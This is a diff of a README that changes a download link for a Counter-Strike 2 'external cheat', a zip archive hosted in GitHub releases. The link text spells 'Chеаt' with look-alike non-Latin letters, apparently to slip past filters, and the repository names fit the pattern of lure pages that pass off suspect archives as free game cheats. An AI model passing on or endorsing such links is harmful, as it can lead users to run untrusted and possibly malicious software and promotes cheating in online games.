@@ -1,5 +1,5 @@
 # Links
-- [Download Cs2 External Chеаt](https://github.com/garraouiismae/psychic-octo-broccoli/releases/download/software/cs2_software.zip)
+- [Download Cs2 External Chеаt](https://github.com/garraouiismae/Counter-Strike-2-Lunar-ESP-Aim-ModMenu-Free/releases/download/software/cs2_software.zip)
 
 
 # Features
